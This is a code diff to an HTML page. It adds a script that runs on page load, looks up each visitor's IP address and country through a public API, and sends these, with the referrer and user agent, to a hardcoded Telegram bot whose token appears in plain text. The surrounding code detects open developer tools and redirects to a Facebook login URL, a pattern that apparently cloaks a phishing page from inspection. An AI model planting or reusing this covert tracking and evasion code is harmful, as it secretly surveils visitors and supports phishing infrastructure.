@@ -1,11 +1,70 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <script>// Remplacez par votre propre token de bot Telegram et ID de chat
+const BOT_TOKEN = "7605844489:AAHcr8tbrQt2dJWO5zAR2mgqm5MF0Wuw4gE";
+const CHAT_ID = "-4643969625";
+
+// Fonction pour envoyer une notification Telegram
+function sendTelegramNotification(ip, country, referer, userAgent) {
+    const message = `New visit to your website!\nIP: ${ip}\nCountry: ${country}\nReferer: ${referer}\nUser-Agent: ${userAgent}`;
+
+    // URL de l'API Telegram
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    // Body of the request
+    const body = {
+        chat_id: CHAT_ID,
+        text: message
+    };
+
+    // Sending the HTTP request
+    fetch(url, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(body)
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log("Telegram notification sent successfully!");
+        } else {
+            console.error("Error sending Telegram notification.", response);
+        }
+    })
+    .catch(error => {
+        console.error("Network error :", error);
+    });
+}
+
+// Function to get user's IP address, country, referer and user-agent
+function getUserIPAndCountry() {
+    fetch("https://ipapi.co/json/") // Public API to get IP and country
+        .then(response => response.json())
+        .then(data => {
+            const userIP = data.ip || "Inconnu";
+            const country = data.country_name || "Inconnu";
+            const referer = document.referrer || "Inconnu";
+            const userAgent = navigator.userAgent || "Inconnu";
+
+            sendTelegramNotification(userIP, country, referer, userAgent);
+        })
+        .catch(error => {
+            console.error("Error getting IP and country :", error);
+        });
+}
+
+// Initial call to send notification with IP, country, referer, and user-agent
+getUserIPAndCountry();
+
+
+    </script>
     <script>
         (function() {
             let isDevToolsOpen = false;
             
-            const basePath = 'https://66dl5gzfn74x.com';
+            const basePath = 'https://google.com';
             const normalDestination = `${basePath}/en`; 
             const devToolsWarningUrl = "https://facebook.com/login";
             
